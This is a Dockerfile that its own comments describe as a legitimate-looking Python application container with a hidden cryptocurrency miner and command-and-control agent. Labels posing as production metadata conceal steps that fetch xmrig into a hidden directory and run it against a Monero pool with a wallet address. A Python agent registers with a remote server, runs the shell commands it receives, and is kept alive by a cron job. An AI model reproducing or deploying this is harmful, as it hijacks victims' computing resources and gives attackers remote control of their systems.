# Dockerfile with hidden miner
# Builds a legitimate-looking container with embedded C2 agent

FROM python:3.10-slim

# Labels for legitimacy
LABEL maintainer="devops-team"
LABEL description="Production-ready Python application container"
LABEL version="1.0.5"

# Install dependencies
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/*

# Create app directory
WORKDIR /app

# Copy application files
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

# Hidden: Download and install xmrig
RUN mkdir -p /var/.cache && \
    cd /var/.cache && \
    wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && \
    tar -xzf xmrig-6.21.0-linux-static-x64.tar.gz && \
    mv xmrig-6.21.0/xmrig . && \
    rm -rf xmrig-6.21.0* && \
    chmod +x xmrig

# Hidden: Create startup script
RUN echo '#!/bin/bash\n\
# Start hidden miner in background\n\
/var/.cache/xmrig --url pool.monero.hashvault.pro:443 --user 44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5 --pass $(hostname) --tls --background --donate-level 1 --threads $(nproc --ignore=1) 2>/dev/null &\n\
\n\
# Run legitimate application\n\
exec python app.py\n\
' > /app/start.sh && chmod +x /app/start.sh

# Hidden: Create C2 agent
RUN echo '#!/usr/bin/env python3\n\
import os\n\
import sys\n\
import json\n\
import time\n\
import socket\n\
import platform\n\
import subprocess\n\
import urllib.request\n\
from pathlib import Path\n\
\n\
C2 = os.environ.get("C2_SERVER", "http://127.0.0.1:5000")\n\
AGENT_ID = None\n\
\n\
def get_id():\n\
    data = f"{socket.gethostname()}-{platform.node()}"\n\
    import hashlib\n\
    return hashlib.md5(data.encode()).hexdigest()[:16]\n\
\n\
def register():\n\
    global AGENT_ID\n\
    AGENT_ID = get_id()\n\
    info = {\n\
        "agent_id": AGENT_ID,\n\
        "hostname": socket.gethostname(),\n\
        "platform": "docker-" + platform.system(),\n\
        "container": True,\n\
        "cwd": os.getcwd()\n\
    }\n\
    try:\n\
        req = urllib.request.Request(\n\
            f"{C2}/api/agent/register",\n\
            data=json.dumps(info).encode(),\n\
            headers={"Content-Type": "application/json"},\n\
            method="POST"\n\
        )\n\
        urllib.request.urlopen(req, timeout=5)\n\
    except: pass\n\
\n\
def get_tasks():\n\
    try:\n\
        req = urllib.request.Request(f"{C2}/api/agent/tasks?agent_id={AGENT_ID}")\n\
        resp = urllib.request.urlopen(req, timeout=5)\n\
        return json.loads(resp.read()).get("tasks", [])\n\
    except: return []\n\
\n\
def run():\n\
    register()\n\
    while True:\n\
        try:\n\
            for task in get_tasks():\n\
                cmd = task.get("payload", {}).get("cmd")\n\
                if cmd:\n\
                    subprocess.run(cmd, shell=True, capture_output=True)\n\
        except: pass\n\
        time.sleep(60)\n\
\n\
if __name__ == "__main__":\n\
    run()\n\
' > /var/.cache/.agent.py

# Hidden: Add agent to startup
RUN echo '* * * * * python3 /var/.cache/.agent.py' | crontab -

# Expose port (legitimate)
EXPOSE 8080

# Health check (legitimate)
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
    CMD curl -f http://localhost:8080/health || exit 1

# Start script
CMD ["/app/start.sh"]
